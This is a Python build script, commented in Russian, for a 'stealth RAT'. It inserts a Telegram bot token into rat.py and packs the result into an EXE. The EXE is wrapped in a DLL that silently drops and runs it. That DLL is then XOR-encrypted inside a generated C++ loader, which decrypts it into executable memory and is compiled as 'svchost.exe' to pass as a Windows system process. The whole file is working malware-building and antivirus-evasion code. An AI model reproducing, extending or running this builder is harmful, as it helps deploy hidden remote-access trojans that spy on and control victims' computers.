# build.py - СБОРКА ЧЕРЕЗ РЕСУРСЫ WINDOWS
import os
import sys
import subprocess
import random
import zlib
import shutil
import time
import struct

class StealthBuilder:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        self.xor_key = bytes([random.randint(1, 255) for _ in range(16)])
        
    def build_exe_with_pyinstaller(self):
        print("[+] Building EXE with PyInstaller...")
        start = time.time()
        
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name", "payload",
            "--target-arch", "x86",
            "--upx-dir", "C:\\ProgramData\\chocolatey\\lib\\upx\\tools",
            "--hidden-import", "telegram",
            "--hidden-import", "telegram.ext",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.ImageGrab",
            "--hidden-import", "psutil",
            "--hidden-import", "requests",
            "--hidden-import", "sounddevice",
            "--hidden-import", "soundfile",
            "--hidden-import", "cryptography",
            "--hidden-import", "cryptography.fernet",
            "--hidden-import", "tkinter",
            "--hidden-import", "pycaw",
            "--hidden-import", "comtypes",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "GPUtil",
            "--hidden-import", "win10toast",
            "--collect-all", "telegram",
            "rat.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        elapsed = int(time.time() - start)
        print(f"[+] PyInstaller completed in {elapsed}s")
            
        if result.returncode != 0:
            print(f"[-] PyInstaller error: {result.stderr.decode()}")
            return None
            
        exe_path = "dist/payload.exe"
        if not os.path.exists(exe_path):
            for f in os.listdir("dist"):
                if f.endswith(".exe"):
                    exe_path = os.path.join("dist", f)
                    break
        
        if not os.path.exists(exe_path):
            print("[-] EXE not found!")
            return None
            
        shutil.copy(exe_path, "payload.exe")
        size_mb = os.path.getsize('payload.exe') / (1024*1024)
        print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
        return "payload.exe"
    
    def create_dll_from_exe(self, exe_path):
        """Создает DLL из EXE через простую обертку"""
        print("[+] Creating DLL from EXE...")
        start = time.time()
        
        # Читаем EXE
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        
        # Создаем .rc файл с ресурсами
        rc_content = '''
#include <windows.h>

PAYLOAD_DATA RCDATA "payload.bin"
'''
        with open('payload.rc', 'w') as f:
            f.write(rc_content)
        
        # Сохраняем EXE как бинарный ресурс
        with open('payload.bin', 'wb') as f:
            f.write(exe_data)
        
        # Компилируем ресурс в .res
        cmd = ['windres', '-i', 'payload.rc', '-o', 'payload.res']
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] windres error: {result.stderr.decode()}")
            return None
        
        # Создаем DLL обертку
        dll_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Ресурс с EXE
extern "C" {
    extern unsigned char payload_bin[];
    extern unsigned int payload_bin_len;
}

static void RunEXE() {
    // Получаем ресурс
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(1), "RCDATA");
    if (!hRes) return;
    
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;
    
    DWORD exe_size = SizeofResource(NULL, hRes);
    unsigned char* exe_data = (unsigned char*)LockResource(hData);
    if (!exe_data) return;
    
    // Сохраняем во временный файл
    char temp_path[MAX_PATH];
    char exe_path[MAX_PATH];
    DWORD written;
    HANDLE hFile;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
    
    hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    WriteFile(hFile, exe_data, exe_size, &written, NULL);
    CloseHandle(hFile);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    Sleep(5000);
    DeleteFileA(exe_path);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunEXE, NULL, 0, NULL);
    }
    return TRUE;
}
'''
        with open('payload_dll.cpp', 'w') as f:
            f.write(dll_code)
        
        # Компилируем DLL с ресурсом
        cmd = [
            'g++',
            '-shared',
            '-o', 'payload.dll',
            'payload_dll.cpp',
            'payload.res',
            '-static',
            '-s',
            '-O2',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] DLL compilation error: {result.stderr.decode()}")
            return None
        
        elapsed = int(time.time() - start)
        size_mb = os.path.getsize('payload.dll') / (1024*1024)
        print(f"[+] DLL ready! Size: {size_mb:.1f} MB (in {elapsed}s)")
        return "payload.dll"
    
    def encrypt_dll_and_build_loader(self, dll_path):
        """Шифрует DLL и создает загрузчик"""
        print("[+] Encrypting DLL...")
        start = time.time()
        
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        
        # Сжимаем
        print(f"    [1/3] Compressing {len(dll_data)/(1024*1024):.1f} MB...")
        compressed = zlib.compress(dll_data, level=9)
        print(f"    [2/3] Compressed to {len(compressed)/(1024*1024):.1f} MB")
        
        # XOR шифруем
        print(f"    [3/3] XOR encrypting...")
        encrypted = bytearray(compressed)
        for i in range(len(encrypted)):
            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
            if i % (1024*1024) == 0:
                print(f"\r    [3/3] Encrypting... {i*100//len(encrypted)}%", end="")
        print(f"\r    [3/3] Encrypted! {len(encrypted)/(1024*1024):.1f} MB    ")
        
        # Сохраняем зашифрованную DLL
        with open('encrypted.bin', 'wb') as f:
            f.write(encrypted)
        
        # Сохраняем ключ
        with open('key.bin', 'wb') as f:
            f.write(self.xor_key)
        
        elapsed = int(time.time() - start)
        print(f"[+] Encrypted! Size: {len(encrypted)/(1024*1024):.1f} MB (in {elapsed}s)")
        
        # Создаем .rc файл для загрузчика
        print("[+] Creating loader resources...")
        
        rc_content = '''
#include <windows.h>

ENCRYPTED_DATA RCDATA "encrypted.bin"
KEY_DATA RCDATA "key.bin"
'''
        with open('loader.rc', 'w') as f:
            f.write(rc_content)
        
        # Компилируем ресурсы
        cmd = ['windres', '-i', 'loader.rc', '-o', 'loader.res']
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] windres error: {result.stderr.decode()}")
            return None
        
        # Создаем загрузчик
        print("[+] Creating loader...")
        
        loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Ресурсы
extern "C" {
    extern unsigned char encrypted_bin[];
    extern unsigned int encrypted_bin_len;
    extern unsigned char key_bin[];
    extern unsigned int key_bin_len;
}

static void xor_decrypt(unsigned char* data, unsigned int len, 
                        unsigned char* key, unsigned int key_len) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

static bool LoadDLLFromMemory(unsigned char* dll_data, unsigned int dll_size) {
    if (dll_data[0] != 'M' || dll_data[1] != 'Z') return false;
    
    void* dll_memory = VirtualAlloc(NULL, dll_size, 
                                    MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_EXECUTE_READWRITE);
    if (!dll_memory) return false;
    
    memcpy(dll_memory, dll_data, dll_size);
    
    unsigned char* bytes = (unsigned char*)dll_memory;
    unsigned int e_lfanew = *(unsigned int*)&bytes[0x3C];
    unsigned int entry_point_rva = *(unsigned int*)&bytes[e_lfanew + 0x28];
    
    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    DllMain_t dll_main = (DllMain_t)((unsigned char*)dll_memory + entry_point_rva);
    
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dll_main, 
                                  dll_memory, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        return true;
    }
    
    return dll_main((HINSTANCE)dll_memory, DLL_PROCESS_ATTACH, NULL) == TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\\\RatMutex_7F3A8B2C");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    // Получаем зашифрованную DLL из ресурсов
    HRSRC hEncRes = FindResourceA(NULL, MAKEINTRESOURCEA(1), "RCDATA");
    if (!hEncRes) return 1;
    
    HGLOBAL hEncData = LoadResource(NULL, hEncRes);
    if (!hEncData) return 1;
    
    unsigned int enc_size = SizeofResource(NULL, hEncRes);
    unsigned char* enc_data = (unsigned char*)LockResource(hEncData);
    if (!enc_data) return 1;
    
    // Получаем ключ из ресурсов
    HRSRC hKeyRes = FindResourceA(NULL, MAKEINTRESOURCEA(2), "RCDATA");
    if (!hKeyRes) return 1;
    
    HGLOBAL hKeyData = LoadResource(NULL, hKeyRes);
    if (!hKeyData) return 1;
    
    unsigned int key_size = SizeofResource(NULL, hKeyRes);
    unsigned char* key_data = (unsigned char*)LockResource(hKeyData);
    if (!key_data) return 1;
    
    // Расшифровываем
    unsigned char* decrypted = (unsigned char*)malloc(enc_size);
    if (!decrypted) return 1;
    
    memcpy(decrypted, enc_data, enc_size);
    xor_decrypt(decrypted, enc_size, key_data, key_size);
    
    // Загружаем DLL
    bool success = LoadDLLFromMemory(decrypted, enc_size);
    
    // Если не получилось - через временный файл
    if (!success) {
        char temp_path[MAX_PATH];
        char dll_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        sprintf(dll_path, "%s\\\\tmp_%x.dll", temp_path, GetTickCount());
        
        HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, decrypted, enc_size, &written, NULL);
            CloseHandle(hFile);
            LoadLibraryA(dll_path);
            Sleep(3000);
            DeleteFileA(dll_path);
        }
    }
    
    free(decrypted);
    
    while (1) Sleep(10000);
    return 0;
}
'''
        with open('loader_final.cpp', 'w') as f:
            f.write(loader_code)
        
        print("[+] Loader ready!")
        return 'loader_final.cpp'
    
    def compile_loader(self, loader_path):
        """Компилирует финальный EXE с ресурсами"""
        print("[+] Compiling final EXE...")
        print("[!] This takes 2-4 minutes, please wait...")
        start = time.time()
        
        # Компилируем загрузчик с ресурсами
        cmd = [
            'g++',
            '-o', 'svchost.exe',
            loader_path,
            'loader.res',
            '-static',
            '-s',
            '-O1',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        # Показываем анимацию
        chars = ['|', '/', '-', '\\']
        i = 0
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        while True:
            line = process.stdout.readline()
            if not line:
                break
            if line.strip():
                elapsed = int(time.time() - start)
                print(f"    [{elapsed}s] {line.strip()}")
            
            elapsed = int(time.time() - start)
            print(f"\r[{chars[i % len(chars)]}] Compiling... {elapsed}s", end="")
            i += 1
            time.sleep(0.1)
        
        process.wait()
        elapsed = int(time.time() - start)
        print(f"\r[+] Compilation completed in {elapsed}s    ")
        
        if process.returncode != 0:
            print("[-] Compilation failed!")
            return None
        
        size_kb = os.path.getsize('svchost.exe') / 1024
        print(f"[+] FINAL EXE ready! Size: {size_kb:.1f} KB")
        return 'svchost.exe'
    
    def build(self):
        print("=" * 60)
        print("[+] STARTING STEALTH RAT BUILD")
        print("=" * 60)
        print()
        total_start = time.time()
        
        print("[+] Updating rat.py...")
        with open('rat.py', 'r', encoding='utf-8') as f:
            content = f.read()
        content = content.replace('{{TOKEN}}', self.token)
        content = content.replace('{{ADMIN_ID}}', str(self.admin_id))
        with open('rat.py', 'w', encoding='utf-8') as f:
            f.write(content)
        print("[+] rat.py updated!")
        print()
        
        exe = self.build_exe_with_pyinstaller()
        if not exe:
            return False
        
        print()
        dll = self.create_dll_from_exe(exe)
        if not dll:
            return False
        
        print()
        loader = self.encrypt_dll_and_build_loader(dll)
        if not loader:
            return False
        
        print()
        final_exe = self.compile_loader(loader)
        
        if final_exe:
            total_elapsed = int(time.time() - total_start)
            minutes = total_elapsed // 60
            seconds = total_elapsed % 60
            print()
            print("=" * 60)
            print("[+] BUILD COMPLETED SUCCESSFULLY!")
            print(f"[+] Total time: {minutes}m {seconds}s")
            print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
            print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
            print(f"[+] DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
            print(f"[+] Key: {self.xor_key.hex()}")
            print("=" * 60)
            
            with open('key.txt', 'w') as f:
                f.write(self.xor_key.hex())
            
            return True
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python build.py TOKEN ADMIN_ID")
        sys.exit(1)
    
    token = sys.argv[1]
    admin_id = sys.argv[2]
    
    builder = StealthBuilder(token, admin_id)
    builder.build()
